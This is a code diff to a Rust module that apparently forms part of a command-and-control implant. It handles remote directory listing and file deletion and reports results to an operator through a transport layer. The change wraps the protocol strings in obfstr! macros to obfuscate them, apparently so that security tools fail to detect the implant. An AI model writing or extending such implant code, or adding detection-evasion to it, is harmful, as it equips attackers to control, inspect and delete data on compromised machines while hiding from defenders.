@@ -2,6 +2,7 @@ use std::fs;
 use std::path::Path;
 use std::io::Write;
 use std::time::UNIX_EPOCH;
+use obfstr::obfstr;
 
 fn resolve_path(raw: &str) -> Result<String, Box<dyn std::error::Error>> {
     if raw.is_empty() || raw == "." {
@@ -51,8 +52,8 @@ fn handle_ls(task: &serde_json::Value, parsed_params: &serde_json::Value) -> Res
                 let entry = entry?;
                 let meta = entry.metadata()?;
                 file_entries.push(serde_json::json!({
-                    "name": entry.file_name().to_string_lossy().to_string(),
-                    "is_file": meta.is_file(),
+                    obfstr!("name"): entry.file_name().to_string_lossy().to_string(),
+                    obfstr!("is_file"): meta.is_file(),
                     "size": meta.len(),
                     "modify_time": timestamp_secs(meta.modified()),
                     "access_time": timestamp_secs(meta.accessed()),
@@ -61,20 +62,20 @@ fn handle_ls(task: &serde_json::Value, parsed_params: &serde_json::Value) -> Res
         }
         Err(e) => {
             let resp = serde_json::json!({
-                "action": "post_response",
-                "responses": [{
-                    "task_id": id,
-                    "file_browser": {
-                        "host": hostname,
-                        "is_file": false,
-                        "name": dir_name,
-                        "parent_path": parent,
-                        "success": false,
-                        "files": []
+                obfstr!("action"): obfstr!("post_response"),
+                obfstr!("responses"): [{
+                    obfstr!("task_id"): id,
+                    obfstr!("file_browser"): {
+                        obfstr!("host"): hostname,
+                        obfstr!("is_file"): false,
+                        obfstr!("name"): dir_name,
+                        obfstr!("parent_path"): parent,
+                        obfstr!("success"): false,
+                        obfstr!("files"): []
                     },
-                    "user_output": format!("Failed to list {}: {}", abs_str, e),
-                    "completed": true,
-                    "status": "error"
+                    obfstr!("user_output"): format!("Failed to list {}: {}", abs_str, e),
+                    obfstr!("completed"): true,
+                    obfstr!("status"): "error"
                 }]
             });
             crate::transport::send_request(&serde_json::to_string(&resp)?)?;
@@ -85,8 +86,8 @@ fn handle_ls(task: &serde_json::Value, parsed_params: &serde_json::Value) -> Res
     // Build text listing for user_output
     let mut listing = format!("Listing: {}\n\n", abs_str);
     for f in &file_entries {
-        let name = f.get("name").and_then(|v| v.as_str()).unwrap_or("?");
-        let is_file = f.get("is_file").and_then(|v| v.as_bool()).unwrap_or(false);
+        let name = f.get(obfstr!("name")).and_then(|v| v.as_str()).unwrap_or("?");
+        let is_file = f.get(obfstr!("is_file")).and_then(|v| v.as_bool()).unwrap_or(false);
         let size = f.get("size").and_then(|v| v.as_u64()).unwrap_or(0);
         if is_file {
             listing.push_str(&format!("  {:>10}  {}\n", size, name));
@@ -97,21 +98,21 @@ fn handle_ls(task: &serde_json::Value, parsed_params: &serde_json::Value) -> Res
     listing.push_str(&format!("\n{} entries", file_entries.len()));
 
     let resp = serde_json::json!({
-        "action": "post_response",
-        "responses": [{
-            "task_id": id,
-            "file_browser": {
-                "host": hostname,
-                "is_file": false,
-                "name": dir_name,
-                "parent_path": parent,
-                "success": true,
-                "update_deleted": true,
-                "files": file_entries
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [{
+            obfstr!("task_id"): id,
+            obfstr!("file_browser"): {
+                obfstr!("host"): hostname,
+                obfstr!("is_file"): false,
+                obfstr!("name"): dir_name,
+                obfstr!("parent_path"): parent,
+                obfstr!("success"): true,
+                obfstr!("update_deleted"): true,
+                obfstr!("files"): file_entries
             },
-            "user_output": listing,
-            "completed": true,
-            "status": "success"
+            obfstr!("user_output"): listing,
+            obfstr!("completed"): true,
+            obfstr!("status"): obfstr!("success")
         }]
     });
     crate::transport::send_request(&serde_json::to_string(&resp)?)?;
@@ -144,7 +145,7 @@ fn handle_rm(task: &serde_json::Value, parsed_params: &serde_json::Value) -> Res
             Ok(_) => (
                 format!("Deleted: {}", abs_str),
                 "success",
-                serde_json::json!([{"host": hostname, "path": abs_str}]),
+                serde_json::json!([{obfstr!("host"): hostname, "path": abs_str}]),
             ),
             Err(e) => (
                 format!("Failed to delete {}: {}", abs_str, e),
@@ -157,13 +158,13 @@ fn handle_rm(task: &serde_json::Value, parsed_params: &serde_json::Value) -> Res
     };
 
     let resp = serde_json::json!({
-        "action": "post_response",
-        "responses": [{
-            "task_id": id,
-            "user_output": output,
-            "completed": true,
-            "status": status,
-            "removed_files": removed
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [{
+            obfstr!("task_id"): id,
+            obfstr!("user_output"): output,
+            obfstr!("completed"): true,
+            obfstr!("status"): status,
+            obfstr!("removed_files"): removed
         }]
     });
     crate::transport::send_request(&serde_json::to_string(&resp)?)?;
@@ -245,13 +246,13 @@ pub fn handle_fs_command(task: &serde_json::Value) -> Result<(), Box<dyn std::er
     };
 
     let response_json = serde_json::json!({
-        "action": "post_response",
-        "responses": [
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [
             {
-                "task_id": task.get("id").unwrap().as_str().unwrap(),
-                "user_output": output,
-                "completed": true,
-                "status": "success",
+                obfstr!("task_id"): task.get("id").unwrap().as_str().unwrap(),
+                obfstr!("user_output"): output,
+                obfstr!("completed"): true,
+                obfstr!("status"): obfstr!("success"),
             }
         ]
     });
